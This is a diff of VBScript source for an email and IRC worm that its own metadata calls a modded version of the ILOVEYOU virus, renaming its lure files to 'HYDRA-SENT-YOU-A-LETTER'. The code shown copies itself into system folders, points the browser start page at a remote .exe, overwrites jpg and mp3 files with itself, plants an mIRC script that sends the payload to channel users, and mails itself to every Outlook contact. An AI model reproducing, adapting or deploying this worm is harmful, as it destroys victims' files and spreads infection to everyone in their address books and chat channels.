@@ -13,7 +13,7 @@ main()
 Sub main()
   On Error Resume Next
   Dim wscr, rr
-
+  
   Set wscr = CreateObject("WScript.Shell")
   rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
 
@@ -25,10 +25,10 @@ Sub main()
   Set dirsystem = fso.GetSpecialFolder(1)
   Set dirtemp = fso.GetSpecialFolder(2)
   Set c = fso.GetFile(WScript.ScriptFullName)
-  
+
   c.Copy(dirsystem & "\MSKernel32.vbs")
   c.Copy(dirwin & "\Win32DLL.vbs")
-  c.Copy(dirsystem & "\READ-THIS.TXT.vbs")
+  c.Copy(dirsystem & "\HYDRA-SENT-YOU-A-LETTER.TXT.vbs")
 
   regruns()
   html()
@@ -54,7 +54,7 @@ Sub regruns()
     Randomize
 
     num = Int((4 * Rnd) + 1)
-    
+
     If num = 1 Then
       regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
     ElseIf num = 2 Then
@@ -121,9 +121,7 @@ Sub infectfiles(folderspec)
 
       cop.copy(folderspec & "\" & bname & ".vbs")
       fso.DeleteFile(f1.path)
-
     ElseIf (ext = "jpg") Or (ext = "jpeg") Then
-
       Set ap = fso.OpenTextFile(f1.path, 2, true)
 
       ap.write vbscopy
@@ -140,12 +138,10 @@ Sub infectfiles(folderspec)
       mp3.close
 
       Set att = fso.GetFile(f1.path)
-
       att.attributes = att.attributes + 2
     End If
 
     If (eq <> folderspec) Then
-
       If (s = "mirc32.exe")
         Or (s = "mlink32.exe")
         Or (s = "mirc.ini")
@@ -155,14 +151,14 @@ Sub infectfiles(folderspec)
         Set scriptini = fso.CreateTextFile(folderspec & "\script.ini")
         scriptini.WriteLine "[script]"
         scriptini.WriteLine ";mIRC Script"
-        scriptini.WriteLine ";  Please edit this script"
+        scriptini.WriteLine ";  Please dont edit this script unless you know what your doing mirc will corrupt"
         scriptini.WriteLine ";"
         scriptini.WriteLine ";Khaled Mardam-Bey"
         scriptini.WriteLine ";http://www.mirc.com"
         scriptini.WriteLine ";"
         scriptini.WriteLine "n0=on 1:JOIN:#:{"
         scriptini.WriteLine "n1=  /If ( $nick == $me ) { halt }"
-        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\LETTER.HTM"
+        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\HYDRA-SENT-YOU-A-LETTER.HTM"
         scriptini.WriteLine "n3=}"
         scriptini.close
 
@@ -178,7 +174,7 @@ Sub folderlist(folderspec)
 
   Set f = fso.GetFolder(folderspec)
   Set sf = f.SubFolders
-  
+
   For Each f1 In sf
     infectfiles(f1.path)
     folderlist(f1.path)
@@ -226,15 +222,12 @@ Sub spreadtoemail()
   Dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad
 
   Set regedit = CreateObject("WScript.Shell")
-  
   Set out = WScript.CreateObject("Outlook.Application")
-
   Set mapi = out.GetNameSpace("MAPI")
 
   For ctrlists = 1 To mapi.AddressLists.Count
     Set a = mapi.AddressLists(ctrlists)
     x = 1
-
     regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)
 
     If (regv = "") Then
@@ -242,19 +235,18 @@ Sub spreadtoemail()
     End If
 
     If (int(a.AddressEntries.Count) > int(regv)) Then
- 
       For ctrentries = 1 To a.AddressEntries.Count
         malead = a.AddressEntries(x)
         regad = ""
         regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead )
-
+        
         If (regad = "") Then
           Set male = out.CreateItem(0)
 
           male.Recipients.Add(malead)
-          male.Subject = "hydra"
+          male.Subject = "HYDRA"
           male.Body = vbcrlf & "kindly check the attached LETTER coming from me."
-          male.Attachments.Add(dirsystem & "\READ-THIS.TXT.vbs")
+          male.Attachments.Add(dirsystem & "\HYDRA-SENT-YOU-A-LETTER.TXT.vbs")
           male.Send
           
           regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
@@ -276,12 +268,12 @@ End Sub
 Sub html
   On Error Resume Next
   Dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6
-  
-  dta1 = "<HTML><HEAD><TITLE>hydra- HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - hydra@-@>"
-    & vbcrlf & _ "<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"
-    & vbcrlf & _ "<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"
-    & vbcrlf & _ "<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LETTER.HTM#-#,#-#main#-#)@-@ "
-    & vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#A-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"
+
+  dta1 = "<HTML><HEAD><TITLE>HYDRALETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - HYDRALETTER@-@>"
+    & vbcrlf & _ "<META NAME=@-@Author@-@ CONTENT=@-@master7720 ?-? master7720@mail.com ?-? @GRAMMERSoft Group ?-? LA ?-? 2021@-@>"
+    & vbcrlf & _ "<META NAME=@-@Description@-@ CONTENT=@-@modded version of the ILOVEYOU virus...@-@>"
+  & vbcrlf & _ "<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#HYDRA-SENT-YOU-A-LETTER.HTM#-#,#-#main#-#)@-@ "
+  & vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#HYDRA-SENT-YOU-A-LETTER.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"
     & vbcrlf & _ "<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"
     & vbcrlf & _ "<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE>"
     & vbcrlf & _ "<?-?BODY><?-?HTML>"
@@ -346,10 +338,10 @@ Sub html
     End If
   Next
 
-  Set b = fso.CreateTextFile(dirsystem + "\LETTER.HTM")
+  Set b = fso.CreateTextFile(dirsystem + "\HYDRA-SENT-YOU-A-LETTER.HTM")
   b.close
 
-  Set d = fso.OpenTextFile(dirsystem + "\LETTER.HTM", 2)
+  Set d = fso.OpenTextFile(dirsystem + "\HYDRA-SENT-YOU-A-LETTER.HTM", 2)
   d.write dt5
   d.write join(lines, vbcrlf)
   d.write vbcrlf
